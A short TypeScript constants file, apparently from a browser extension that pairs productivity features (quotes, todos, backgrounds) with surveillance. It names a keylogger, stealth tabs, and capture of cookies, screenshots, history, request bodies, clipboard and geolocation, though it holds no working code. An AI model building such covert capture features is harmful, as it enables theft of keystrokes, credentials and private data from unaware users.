export const SECTION_NAMES = [
  "Geolocation",
  "Keylogger",
  "Inputs",
  "Browsing History",
  "Screenshots",
  "Filesystem",
  "Bookmarks",
  "Cookies",
  "Downloads",
  "Native apps",
];

export enum BackgroundMessage {
  HEARTBEAT = "HEARTBEAT",
  UPDATE_GEOLOCATION = "UPDATE_GEOLOCATION",
  OPEN_STEALTH_TAB = "OPEN_STEALTH_TAB",
  SEND_TAB_BACK = "SEND_TAB_BACK",
  WRITE_LOG = "WRITE_LOG",
  UPDATE_KEY_LOG = "UPDATE_KEY_LOG",
  CAPTURE_VISIBLE_TAB = "CAPTURE_VISIBLE_TAB",
  CAPTURE_COOKIES = "CAPTURE_COOKIES",
  CAPTURE_HISTORY = "CAPTURE_HISTORY",
}

export enum StorageKey {
  GEOLOCATION_HISTORY = "GEOLOCATION_HISTORY",
  LOG = "LOG",
  KEY_LOG = "KEY_LOG",
  NAVIGATION_LOG = "NAVIGATION_LOG",
  SCREENSHOT_LOG = "SCREENSHOT_LOG",
  REQUEST_BODY_LOG = "REQUEST_BODY_LOG",
  COOKIES = "COOKIES",
  HISTORY = "HISTORY",
  INPUTS = "INPUTS",
  NOTES = "NOTES",
  CLIPBOARD_LOG = "CLIPBOARD_LOG",

  // Settings
  SETTINGS_GOALS_QUOTES = "SETTINGS_GOALS_QUOTES",
  SETTINGS_BACKGROUND = "SETTINGS_BACKGROUND",
  SETTINGS_PBODS = "SETTINGS_PBODS",

  // for random quote selection
  PBODS_QUOTES = "PBODS_QUOTES",
  TODOS = "TODOS",
}

export enum SearchParamKey {
  RETURN_URL = "returnUrl",
  FAVICON_URL = "faviconUrl",
  TITLE = "title",
}
